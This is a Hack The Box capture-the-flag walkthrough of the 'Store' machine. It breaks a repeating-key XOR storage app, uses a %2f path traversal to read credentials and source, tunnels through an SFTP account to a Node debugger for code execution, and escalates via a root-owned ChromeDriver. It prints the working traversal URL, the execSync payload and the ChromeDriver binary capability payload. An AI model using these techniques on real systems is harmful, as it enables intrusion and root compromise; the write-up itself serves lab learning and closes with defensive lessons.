# Store — Hack The Box, Hard, Linux

**TL;DR:** Three identical Node "Secure Encrypted Storage" apps whose military-
grade cipher is a 9-byte repeating-key XOR — one known plaintext recovers it.
`GET /file/:name` gates its `path.normalize` check on the *SFTP fetch* and reads
the local traversed path regardless, so the traversal is an arbitrary file read
that returns everything XOR-decoded: the source, the `.env`, and `user.txt`. The
leaked `sftpuser` is chrooted to `internal-sftp` but never denied TCP
forwarding, so it tunnels to a localhost `node --inspect` debugger —
`Runtime.evaluate` is RCE as `dev`. Root is a root-owned ChromeDriver on
`127.0.0.1:9515`: `file:///root/root.txt` reads it, and
`goog:chromeOptions.binary` executes as root.

*Flags redacted. Machine address generalised to `10.129.x.x`.*

---

## Recon

```
22/tcp   OpenSSH 8.9p1 Ubuntu 22.04
5000/tcp Node.js (Express) "Secure Encrypted Storage"
5001/tcp Node.js (Express)   "  (identical)
5002/tcp Node.js (Express)   "  (identical)
```

Three copies of the same app. Each offers **Upload**, **List**, and a read view
at `/file/<name>`. Uploading a file to 5000 made it appear on 5001 and 5002 too —
shared backend. The page title is binary that decodes to "Military Grade".

## The "encryption" is XOR

Directory fuzzing showed the app serves static content, and uploaded files were
reachable *raw* at `/tmp/<name>` (the app does `express.static('public')` and
stores uploads in `public/tmp/`). Uploading the 17-byte plaintext
`AAAABBBBCCCCDDDD\n` produced a **17-byte** blob — same length, so it is a
stream/XOR cipher, not a block cipher.

XORing plaintext against ciphertext gives the keystream directly. The keystream
repeated every 9 bytes: the key is the ASCII string **`Hm9zeWC38`**. "Military
grade" is a static repeating-key XOR.

Because the read view decrypts with this same key, and I now *know* the key, any
file the app returns can be decoded back to its true bytes.

## Arbitrary file read

`GET /file/:file` builds `filePath = ${STORE_HOME}/public/tmp/${name}`. The
route parameter is a single path segment, but **URL-encoded slashes** (`%2f`)
smuggle a traversal into it:

```
/file/..%2f..%2fapp.js      → reads app.js (2 levels up from public/tmp)
```

The handler's own source (recovered by this very read, then XOR-decoded)
explains why it works:

```js
const filePath = `${process.env.STORE_HOME}/public/tmp/${name}`;
if (path.normalize(filePath) == filePath) {      // false for a traversal
    await client.downloadFile(`files/${name}`, filePath);   // ...so this is skipped
}
const data = await xorFileContents(filePath, process.env.SECRET, false);
res.render('file', { data, b64data: Buffer.from(data).toString('base64') });
```

The `normalize` check was meant to guard the path, but it only gates the *remote
SFTP fetch*. When it fails (which is exactly what a `..` path does), the code
falls through and reads the **local** traversed path anyway. The response is the
file XOR-decoded — and the download link even hands you clean base64 of the
decoded bytes, so recovering source is a one-liner.

Everything runs as the service user `dev`, so the read yields `dev`'s files too.

### What it leaked

- `app.js` → `routes/index.js` → `sftp.js`, `crypto.js`.
- `.env`:

  ```
  SFTP_URL=sftp://sftpuser:REDACTED@localhost
  SECRET=Hm9zeWC38
  STORE_HOME=/home/dev/projects/store1
  ```
- `/proc/self/environ` → the app is run by nodemon as
  `node --inspect=127.0.0.1:9229 …` — a live V8 debugger on localhost.
- `/home/dev/user.txt` — directly readable. **user.txt down with only a file read.**

## Foothold: the SFTP account that forwards

`sftpuser` is a locked-down SFTP account:

```
Match User sftpuser
    ForceCommand internal-sftp
    ChrootDirectory /var/sftp
    AllowAgentForwarding no
    X11Forwarding no
```

No shell, chrooted — but the block never sets `AllowTcpForwarding no`, and the
global default is `yes`. So even though `sftpuser` can't run a command, it can
open a **TCP tunnel**:

```
ssh -N -L 9229:127.0.0.1:9229 sftpuser@10.129.x.x
```

That reaches the Node inspector. The Chrome DevTools Protocol's
`Runtime.evaluate` runs arbitrary JavaScript *inside the app process*, and Node
gives you the runtime:

```js
process.mainModule.require('child_process').execSync('id')   // uid=1001(dev)
```

A minimal raw-WebSocket CDP client (`www/inspect.py`) drove this; I used it to
append an SSH key to `/home/dev/.ssh/authorized_keys` for a stable
`ssh dev@` shell.

*Gotcha worth noting:* the app logs constantly, so the inspector floods
`Runtime.consoleAPICalled` events — the client must keep reading until it sees
its own `id:2` reply rather than capping the number of frames.

## Privilege escalation: ChromeDriver as root

Local enumeration as `dev`:

```
root  /root/chromedriver
127.0.0.1:9515  LISTEN         # Selenium WebDriver, owned by root
127.0.0.1:9515  chrome 110
```

A **root-owned ChromeDriver** on localhost is game over. Two ways to use it, both
just HTTP to `:9515` (no tunnel needed — I was already on the box as `dev`):

1. **Read root's files.** Create a session (`--headless --no-sandbox`; root
   Chrome needs `--no-sandbox`), navigate to `file:///root/root.txt`, read the
   page source. Chrome is root, so the file comes back. **root.txt down.**

2. **Execute as root.** ChromeDriver launches the browser binary you name in
   `goog:chromeOptions.binary` — as root. Point it at a `dev`-owned script:

   ```json
   {"capabilities":{"alwaysMatch":{"goog:chromeOptions":
     {"binary":"/dev/shm/.r.sh","args":["--headless"]}}}}
   ```

   The session creation "fails" (the script isn't a browser), but the script
   already ran as root. It appended my key to `/root/.ssh/authorized_keys`.

   > Dead end avoided: my first script made a SUID `bash` in `/dev/shm` — inert,
   > because `/dev/shm` and `/tmp` are `nosuid`. Dropping a key into root's
   > `authorized_keys` sidesteps the mount options entirely.

```
ssh -i dev_key root@10.129.x.x   →  uid=0(root)
```

## Lessons

- **Same-length ciphertext is XOR.** The first thing to check on any "encrypted"
  store is whether |ct| == |pt|; if so, one known plaintext is the whole key.
- **A normalize/canonicalize check that guards the wrong operation is no guard.**
  Here `path.normalize(x)==x` was true security logic wired to the SFTP fetch,
  while the dangerous local read ran unconditionally.
- **`ForceCommand internal-sftp` + chroot is not a jail if forwarding is on.**
  TCP forwarding is a separate switch; an SFTP-only account can still be a pivot
  onto localhost-only services.
- **Anything root-owned on a localhost port is the privesc.** ChromeDriver bound
  to `127.0.0.1` as root gives both arbitrary file read (`file://`) and
  arbitrary execution (`chromeOptions.binary`).
